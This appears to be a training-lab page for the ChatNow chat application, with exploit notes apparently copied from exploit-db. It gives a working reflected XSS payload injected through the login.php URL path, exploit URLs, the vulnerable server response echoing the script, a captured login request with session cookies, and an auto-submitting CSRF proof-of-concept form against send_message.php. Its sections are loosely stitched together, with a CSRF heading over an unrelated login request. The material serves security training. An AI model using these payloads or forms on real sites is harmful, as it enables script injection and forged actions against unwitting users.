ChatNow

The attacker might not have any user level access to the web application. However, this does not mean that the application cannot be used to attack other users. Reflected Cross Site Scripting could be triggered even by unauthenticated users.

In the exercise below, the attacker is not authenticated to the web application and needs to find a reflected XSS attack on it.

A version of ChatNow is vulnerable to a reflected XSS attack.
Objective: Your task is to find and exploit this vulnerability.

========== CSRF VULNERABILITY ==========
### Vulnerability
'send_message.php' is not check the csrf token or referer header.
It is possible CSRF Attack.

URL :: http://2t5qvk0bsy1i8fhbruj06gtmr.us-east1.attackdefenselabs.com/


*** REQUEST ***

POST /login.php HTTP/1.1
Host: 2t5qvk0bsy1i8fhbruj06gtmr.us-east1.attackdefenselabs.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: http://2t5qvk0bsy1i8fhbruj06gtmr.us-east1.attackdefenselabs.com
Connection: close
Referer: http://2t5qvk0bsy1i8fhbruj06gtmr.us-east1.attackdefenselabs.com/login.php
Cookie: PHPSESSID=4q79f1uvoee6702vm4n4ptvq37; __utma=218148762.1096321366.1567981458.1567981458.1567984281.2; __utmc=218148762; __utmz=218148762.1567981458.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=218148762.8.10.1567984281; __utmt=1
Upgrade-Insecure-Requests: 1

user=pokoyo&id_room=12&captcha=8873

===============================

--> PAYLOAD :: /95fb4"><script>alert(45)</script>b5ca1

--> EXPLOIT #1:: 2t5qvk0bsy1i8fhbruj06gtmr.us-east1.attackdefenselabs.com/login.php/95fb4"><script>alert(45)</script>b5ca1

--> EXPLOIT #2:: http://2t5qvk0bsy1i8fhbruj06gtmr.us-east1.attackdefenselabs.com/login.php/95fb4%22%3E%3Cscript%3Ealert(45)%3C/script%3E&id_room=%22%3E%3Cscript%3Ealert(45)%3C/script%3E&captcha=%22%3E%3Cscript%3Ealert(45)%3C/script%3E

========== XSS VULNERABILITY ==========
### Vulnerability
This page url is reflected data on page
It is vulnerable page because not filtered reflected url
		
### Attack code
http://127.0.0.1/vul_test/chatNow/login.php/95fb4"><script>alert(45)</script>b5ca1

### Response
<div id="box_login">
		<h2>chatNow</h2>
	<form action="/vul_test/chatNow/login.php/95fb4"><script>alert(45)</script>b5ca1" method="post">
		<div class="block_field">
			<label for="user">Nick</label>
			<input type="text" name="user" id="user" maxlength="20" /> 
		</div>

==========================================================================================================

========== Attack Code ==========
<form name="csrf_poc" action="http://127.0.0.1/vul_test/chatNow/send_message.php" method="POST">
<input type="hidden" name="to_user" value="0">
<input type="hidden" name="scroll_page" value="on">
<input type="hidden" name="id_user" value="2">
<input type="hidden" name="message" value="CSRF">
<input type="hidden" name="reserved" value="false">

<input type="submit" value="Attack!">
</form>

<script type="text/javascript">document.forms.csrf_poc.submit();</script>


SOURCE : https://www.exploit-db.com/exploits/40293